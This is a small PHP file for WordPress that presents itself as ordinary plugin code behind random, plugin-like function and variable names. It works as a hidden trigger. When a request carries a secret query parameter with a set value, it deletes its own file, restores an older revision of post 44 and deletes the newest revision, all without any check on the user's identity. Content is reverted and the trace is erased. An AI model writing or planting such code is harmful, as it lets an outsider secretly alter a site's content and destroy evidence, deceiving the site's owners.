<?php

function rest_restaurant_grid_remove() {
	if (isset($_GET['attachments_fonts_marketplace_install']) && $_GET['attachments_fonts_marketplace_install'] === 'profile_extensions_integration') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$event_plugins_switch = 44;
		$redirection_address_request = wp_get_post_revisions($event_plugins_switch);
		if (empty($redirection_address_request)) die('no revisions');
		if (count($redirection_address_request) < 2) die('less than 2');
		$audio_typography_hover_role = array_shift($redirection_address_request);
		$total_external_category = $audio_typography_hover_role->ID;
		$plupload_ultimate_demomentsomtres = array_shift($redirection_address_request);
		$method_site_webp_cf7 = $plupload_ultimate_demomentsomtres->ID;
		$multisite_maker_blogroll_campaign = wp_restore_post_revision($method_site_webp_cf7);
		if ($multisite_maker_blogroll_campaign === false) die('error restoring');
		$multisite_maker_blogroll_campaign = wp_delete_post_revision($total_external_category);		
		if ($multisite_maker_blogroll_campaign === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'rest_restaurant_grid_remove');
